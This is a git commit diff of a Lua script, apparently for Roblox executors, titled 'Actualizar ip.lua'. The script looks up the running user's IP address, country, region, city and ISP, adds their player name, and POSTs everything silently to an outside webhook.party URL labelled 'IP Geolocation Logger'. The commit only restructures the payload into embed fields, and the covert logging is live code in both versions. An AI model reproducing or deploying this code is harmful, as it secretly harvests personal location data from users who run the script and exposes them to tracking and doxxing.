4b27915f71da1c236d9f24648cc25e1c3c6847a2
xielbers <88589081+xielbers@users.noreply.github.com>
2025-07-22 13:04:33 -0300

    Actualizar ip.lua

--- copy/ip.lua
+++ copy/ip.lua
@@ -11,16 +11,27 @@ local function getIPInfo()
     return success and result or {}
 end
 
-local info = getIPInfo()
+local ipData = getIPInfo()
 
-local data = {
-    username = player and player.Name or "Unknown",
-    ip = info.ip or "Unknown",
-    country = info.country_name or "Unknown",
-    region = info.region or "Unknown",
-    city = info.city or "Unknown",
-    isp = info.org or "Unknown",
-    executed_script = script_executed
+local function createField(name, key)
+    local value = ipData[key] and tostring(ipData[key]) or "Not Found"
+    if key == "executed_script" then
+        value = script_executed
+    end
+    return {
+        name = name,
+        value = value,
+        inline = true
+    }
+end
+
+local fields = {
+    createField("IP Address", "ip"),
+    createField("Country", "country_name"),
+    createField("Region", "region"),
+    createField("City", "city"),
+    createField("ISP", "org"),
+    createField("Executed Script", "executed_script")
 }
 
 local webhook_url = "https://l.webhook.party/hook/UhmC9lTLZKI6YMQfc9LwrwLPFzL%2BGxFO%2BstLQOE3slw9Bev78Zkfkc0IOdkr6%2Fvo45MpGmza1zthpwRkkP972KrY1Zdpp6kiK5LzyMr09xxU8%2FdybOnABAdHQG2tZZGd2Rcu9uY7DLe3YChbg7Silc9K9sYiRACjKoWOP1ntopw7zpCvqeGUaGZs5Zmiy7A%2BmKiYOe2iHdy4mH2Udl0%2FI%2FMB20D9U7pKmnbTQcKATLXml9l1oVTDeC9O3BRo%2FLrj0UbFr6BiFDgAdmuHAifBuGhQMBmY56JA%2BG2Aot8qMhpPnqVOn8Os8YKZ4N%2BRcFG7agnQWPVjwLgWJ4G2MQ3AZywHy47Kz4ONmhkx150FbG4XZdGZxcCaZsDAz4xm%2FQG8XRi4GWRkPKw%3D/ViaTuzjhjElC6x2r"
@@ -29,7 +40,18 @@ pcall(function()
     (request or http_request or http and http.request)({
         Url = webhook_url,
         Method = "POST",
-        Body = HttpService:JSONEncode({content = "**Usuario nuevo**\n```json\n" .. HttpService:JSONEncode(data) .. "\n```"}),
-        Headers = {["content-type"] = "application/json"}
+        Headers = {
+            ["content-type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            username = "IP Geolocation Logger",
+            embeds = {
+                {
+                    title = "Nuevo usuario detectado: "..(player and player.Name or "Unknown"),
+                    color = 1733608,
+                    fields = fields
+                }
+            }
+        })
     })
 end)
